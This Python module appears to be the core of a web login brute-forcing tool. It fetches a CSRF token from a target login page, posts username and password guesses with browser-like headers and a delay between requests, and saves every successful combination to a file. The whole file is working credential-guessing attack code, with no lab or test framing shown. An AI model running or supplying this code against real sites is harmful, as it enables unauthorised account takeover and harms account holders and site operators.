import time
import requests
from typing import Optional, Set
from bs4 import BeautifulSoup
from utils.files_read_write_utils import save_to_file
from settings import (
                      LOGIN_PAGE,
                      LOGIN_POST,
                      SUCCESS_FILE_PATH,
                      PASSWORD_PARAM_STRING,
                      LOGIN_PARAM_STRING,
                      CSRF_PARAM_STRING,
                      DELAY_BETWEEN_REQUESTS
                  )


def create_session() -> Optional[requests.Session]:
    """
    Creates a new HTTP session and checks server availability.

    Returns:
        Optional[requests.Session]: A configured session if the server is reachable,
                                    None otherwise.
    """
    session = requests.Session()
    session.headers.update(
        {
            "User-Agent": "Mozilla/5.0",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
        }
    )
    try:
        r = session.get(LOGIN_PAGE, timeout=10)
        if r.status_code != 200:
            print(f"[!] Server returned status: {r.status_code}")
            return None
    except requests.RequestException as e:
        print(f"[!] Connection error: {e}")
        return None
    return session


def get_csrf_token(session: requests.Session) -> Optional[str]:
    """
    Retrieves the CSRF token from the login page.

    Args:
        session (requests.Session): The active HTTP session.

    Returns:
        Optional[str]: The CSRF token if found, None otherwise.
    """
    try:
        r = session.get(LOGIN_PAGE)
        soup = BeautifulSoup(r.text, "html.parser")
        token_input = soup.find("input", {"name": "csrf_token"})
        if token_input:
            token = token_input.get("value")
            print(f"[DEBUG] CSRF token: {token}")
            return token
    except Exception as e:
        print(f"[!] Error retrieving CSRF token: {e}")
    return None


def try_login(
    session: requests.Session, known_success: Set[str], username: str, password: str
) -> bool:
    """Attempt to log in with given credentials.

    Args:
        session (requests.Session): Active HTTP session.
        known_success (Set[str]): Set of successful username:password combos.
        username (str): Username to try.
        password (str): Password to try.

    Returns:
        bool: True if login successful, False otherwise.
    """
    data = {LOGIN_PARAM_STRING: username, PASSWORD_PARAM_STRING: password}
    csrf_token = get_csrf_token(session)
    if csrf_token:
        data[CSRF_PARAM_STRING] = csrf_token

    try:
        resp = session.post(LOGIN_POST, data=data)
        time.sleep(DELAY_BETWEEN_REQUESTS)

        if resp.status_code != 200:
            print(f"[!] Unexpected status {resp.status_code} for {username}:{password}")
            return False

        try:
            response_json = resp.json()
        except ValueError:
            print(f"[!] Non-JSON response for {username}:{password}")
            return False

        if response_json.get("error") is False:
            combo = f"{username}:{password}"
            if combo not in known_success:
                save_to_file(SUCCESS_FILE_PATH, combo)
                known_success.add(combo)
            print(f"[+] Success: {combo}")
            return True

        print(f"[-] Failed: {username}:{password}")
    except Exception as e:
        print(f"[!] Response error for {username}:{password} -> {e}")
    return False
